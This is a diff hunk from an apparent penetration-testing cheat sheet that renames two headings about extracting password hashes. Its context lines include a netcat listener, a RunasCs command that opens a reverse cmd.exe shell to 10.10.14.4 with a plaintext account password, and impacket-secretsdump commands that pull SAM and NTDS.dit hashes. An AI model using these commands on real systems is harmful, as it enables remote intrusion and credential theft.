@@ -191,13 +191,13 @@ rlwrap nc -nlvp 464
 .\RunasCs.exe 'M.schoolbus' '!suBcig@MehTed!R' cmd.exe -r 10.10.14.4:464
 ```
 
-### Dump the local password hash and domain cached hash
+### Offline analyze sam hash and system file
 ```
 Extract hashes from windows.old's sam and system file:
 
 impacket-secretsdump -sam SAM(local SAM file) -system SYSTEM(local SYSTEM file) local
 ```
-### Dump the NTDS.dit Database
+### Offline analyze NTDS.dit Database and System file
 ```
 impacket-secretdump -ntds NTDS.dit(C:\windows\ntds\) -system SYSTEM local0
 ```
